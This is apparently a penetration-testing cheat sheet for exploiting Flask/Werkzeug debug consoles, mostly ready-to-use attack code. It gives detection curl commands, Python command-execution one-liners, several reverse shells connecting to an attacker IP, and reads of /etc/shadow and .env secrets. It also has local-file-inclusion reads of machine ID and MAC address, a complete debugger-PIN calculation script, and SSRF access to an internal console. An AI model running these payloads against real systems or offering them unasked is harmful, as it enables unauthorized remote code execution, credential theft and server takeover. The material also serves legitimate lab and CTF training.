#Werkzeug #Flask #Python #debugconsole #RCE #webservices

## What is Werkzeug?
WSGI utility library underlying Flask. When debug mode is enabled, Werkzeug exposes an interactive Python console at `/console` — accessible in-browser, no auth by default. Execution happens as the web app user (often `www-data`, `root`, or the app's service account). Extremely common in HTB web boxes.

- Port: **TCP 5000** (Flask default), also seen on 8000, 8080, 8888
- Debug console path: `/console`
- Triggered by: `app.run(debug=True)` or `FLASK_DEBUG=1`
- PIN protection: Werkzeug >= 0.11 adds a PIN — but it's calculable

---

## Identification

```bash
# Check for debug mode indicators
curl -s http://<target>:5000/console
curl -s http://<target>:5000/nonexistent   # 404 in debug mode shows Werkzeug debugger

# Werkzeug debugger in response headers / error pages
curl -v http://<target>:5000/trigger_error 2>&1 | grep -i "werkzeug\|debugger"

# Page source check
curl -s http://<target>:5000/ | grep -i "werkzeug\|flask\|debugger"

# Nmap
nmap -p 5000 --script http-title,banner -sV <target>

# Common indicators:
# - "Werkzeug Debugger" in page title
# - Interactive traceback with terminal icon on error pages
# - /console returns Python shell HTML
```

---

## Attack Vectors

### No-PIN Console — Direct RCE

```bash
# Navigate to console
http://<target>:5000/console

# Execute OS commands in the browser Python console:
import os; os.system('id')
import os; os.popen('id').read()
import subprocess; subprocess.check_output(['id']).decode()

# Reverse shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<attacker_ip>',<port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])

# One-liner reverse shell
import os; os.system('bash -c "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"')

# Read files
open('/etc/passwd').read()
open('/etc/shadow').read()
open('/app/app.py').read()
open('/app/config.py').read()

# Write files
open('/tmp/shell.sh','w').write('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1')
os.system('bash /tmp/shell.sh')
```

### PIN Bypass / Calculation (Werkzeug >= 0.11)

When `/console` shows a PIN prompt, the PIN is deterministic and calculable from system info.

**Information needed:**
- Username running the app
- Flask app `__name__` (usually `flask.app`)
- Flask `app.py` absolute path
- MAC address of network interface
- Machine ID (`/etc/machine-id` or `/proc/sys/kernel/random/boot_id`)

```bash
# Step 1: Gather required info via LFI or other read primitive

# App username
curl "http://<target>/lfi?file=/proc/self/status" | grep -i "name\|uid"
# or /etc/passwd, /proc/self/environ

# MAC address (convert to integer)
curl "http://<target>/lfi?file=/sys/class/net/eth0/address"
# e.g. 02:42:ac:11:00:02 → strip colons → int('0242ac110002', 16) = 2485377892354

# Machine ID
curl "http://<target>/lfi?file=/etc/machine-id"
curl "http://<target>/lfi?file=/proc/sys/kernel/random/boot_id"
# Combine if both exist: machine_id + first part of boot_id

# cgroup (for Docker containers — additional machine-id source)
curl "http://<target>/lfi?file=/proc/self/cgroup"
# Last field of last line → container ID

# Flask app path
curl "http://<target>/lfi?file=/proc/self/cmdline" | tr '\0' ' '
# or check /proc/self/environ for PWD, then guess app.py path
```

```python
# Step 2: Calculate PIN — run this locally on Kali

import hashlib
import itertools
from itertools import chain

# Fill in gathered values:
username       = 'www-data'                        # user running flask
modname        = 'flask.app'                       # usually flask.app
appname        = 'Flask'                           # usually Flask
flask_app_path = '/app/app.py'                     # absolute path to app.py
mac_address    = int('0242ac110002', 16)           # MAC as int (no colons)
machine_id     = b'<machine-id-string>'            # /etc/machine-id content (strip newline)

# For Docker: append container ID suffix if machine-id not found
# machine_id = b'<machine-id>' + b'<container_id_suffix>'

probably_public_bits = [
    username,
    modname,
    appname,
    flask_app_path,
]

private_bits = [
    str(mac_address),
    machine_id.decode().strip(),
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
rv = None
for group_size in (5, 4, 3):
    if len(h.hexdigest()) >= group_size:
        num = int(h.hexdigest()[:group_size], 16)
        rv  = ('%d-%d-%d' % (num // 100, (num % 100) // 10, num % 10))
        break

print(f'PIN: {rv}')
```

```python
# Newer Werkzeug (>= 2.x) uses different hash — use this version:
import hashlib, itertools
from itertools import chain

probably_public_bits = [
    '<username>',       # user running the process
    'flask.app',
    'Flask',
    '/path/to/app.py',  # absolute path
]

private_bits = [
    '<mac_as_int>',     # int('macwithoutcolons', 16)
    '<machine_id>',     # /etc/machine-id (strip newline)
]

h = hashlib.md5()    # newer versions use md5
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

num = int(h.hexdigest(), 16)
pin = '-'.join([
    str(num // 10 ** (i * 3 + 6) % 1000).zfill(3)
    for i in reversed(range(3))
])
print(f'PIN: {pin}')
```

> [!note]
> Werkzeug version determines SHA1 vs MD5. Check response headers or error pages for version. Try both if unsure. The PIN format is `XXX-XXX-XXX`.

### LFI → PIN Calculation → Console RCE (Full Chain)

```bash
# Common scenario: Flask app with LFI in a parameter
# 1. Identify LFI
curl "http://<target>/download?file=/etc/passwd"

# 2. Gather all PIN ingredients
curl "http://<target>/download?file=/proc/self/environ" | tr '\0' '\n'
curl "http://<target>/download?file=/proc/self/cmdline" | tr '\0' ' '
curl "http://<target>/download?file=/sys/class/net/eth0/address"
curl "http://<target>/download?file=/etc/machine-id"
curl "http://<target>/download?file=/proc/self/cgroup"

# 3. Calculate PIN (Python script above)

# 4. Enter PIN at /console → get Python shell → RCE
```

### SSRF → Internal Console

```bash
# If Flask debug console only on localhost:
# Use SSRF vulnerability to hit internal /console
curl "http://<target>/ssrf?url=http://127.0.0.1:5000/console"
```

---

## Post-Console — Useful Python Commands

```python
# System recon
import os, subprocess
os.popen('whoami').read()
os.popen('hostname').read()
os.popen('ip a').read()
os.popen('cat /etc/passwd').read()
os.popen('cat /etc/shadow').read()

# Find interesting files
os.popen('find / -name "*.py" 2>/dev/null').read()
os.popen('find / -name "config*" 2>/dev/null').read()
os.popen('find / -name ".env" 2>/dev/null').read()
os.popen('find / -perm -4000 2>/dev/null').read()   # SUID files

# Read app config (credentials, secret key, DB connection strings)
open('/app/config.py').read()
open('/app/.env').read()
open('/app/settings.py').read()

# Check environment variables (often contain secrets)
import os; dict(os.environ)

# Reverse shell (most reliable)
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<attacker_ip>',<port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn('/bin/bash')
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `app.run(debug=True)` in production | Interactive Python console on /console |
| `FLASK_DEBUG=1` environment variable | Same as above |
| No PIN protection (old Werkzeug) | Direct unauthenticated RCE |
| PIN protection but LFI exists | PIN calculable → RCE |
| App running as root | Console gives immediate root shell |
| Secrets in environment variables | Readable from console |

---

## Quick Reference

| Goal | Command |
|---|---|
| Identify | `curl -s http://host:5000/console` |
| Error-based confirm | `curl http://host:5000/doesnotexist` (Werkzeug traceback) |
| Direct RCE (no PIN) | Python console: `import os; os.popen('id').read()` |
| Reverse shell | `import os; os.system('bash -c "bash -i >& /dev/tcp/attacker/port 0>&1"')` |
| Read file | `open('/etc/passwd').read()` |
| Get MAC | `curl "http://host/lfi?file=/sys/class/net/eth0/address"` |
| Get machine-id | `curl "http://host/lfi?file=/etc/machine-id"` |
| Calculate PIN | Run PIN Python script with gathered values |
